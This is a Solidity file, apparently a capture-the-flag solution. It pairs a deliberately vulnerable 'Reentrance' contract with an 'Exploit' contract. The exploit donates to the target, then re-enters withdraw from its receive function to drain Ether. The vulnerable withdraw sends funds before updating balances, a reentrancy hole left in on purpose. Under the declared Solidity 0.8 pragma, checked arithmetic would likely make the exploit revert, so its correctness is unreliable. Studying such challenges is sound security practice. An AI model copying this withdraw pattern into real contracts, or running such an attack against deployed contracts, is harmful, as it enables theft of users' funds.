// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "exploit_templates/Destructible.sol";
import "exploit_templates/Targeted.sol";

contract Reentrance {

  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to] + msg.value;
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}


contract Exploit is Destructible, Targeted {
  uint depth = 0;
  constructor(address target_addr) payable Targeted(target_addr) {
  }
  function exploit() public payable {
    depth = 0;
    Reentrance target = Reentrance(payable(Targeted(this).target()));

    // get the balance of the reentrance contract
    target.donate{value: msg.value}(address(this));
    target.withdraw(msg.value);
  }
  receive() external payable {
    if (depth == 0) {
      depth = 1;
      Reentrance target = Reentrance(payable(Targeted(this).target()));
      target.withdraw(msg.value);
    }
  }
}